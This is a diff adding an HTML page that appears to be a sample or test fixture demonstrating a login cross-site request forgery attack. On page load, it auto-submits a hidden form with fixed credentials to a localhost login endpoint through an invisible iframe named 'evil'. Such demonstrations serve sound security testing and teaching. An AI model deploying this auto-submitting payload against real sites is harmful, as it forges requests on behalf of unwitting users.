@@ -1,0 +1,35 @@
+<!doctype html>
+<!--
+  ~ Copyright 2002-2018 the original author or authors.
+  ~
+  ~ Licensed under the Apache License, Version 2.0 (the "License");
+  ~ you may not use this file except in compliance with the License.
+  ~ You may obtain a copy of the License at
+  ~
+  ~      http://www.apache.org/licenses/LICENSE-2.0
+  ~
+  ~ Unless required by applicable law or agreed to in writing, software
+  ~ distributed under the License is distributed on an "AS IS" BASIS,
+  ~ WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  ~ See the License for the specific language governing permissions and
+  ~ limitations under the License.
+  -->
+
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <title>CSRF - Log In</title>
+    <script type="text/javascript">
+        function csrf() {
+            document.getElementById('csrf').submit();
+            setTimeout(function(){ window.location.replace('http://localhost:8080/') }, 1000);
+        }
+    </script>
+</head>
+<body onload="csrf()">
+    <form id="csrf" action="http://localhost:8080/login" method="post" target="evil" id="evil">
+        <input type="hidden" name="username" value="use1"/>
+        <input type="hidden" name="password" value="password" />
+    </form>
+    <iframe style="display:none" name="evil"></iframe>
+</body>
+</html>
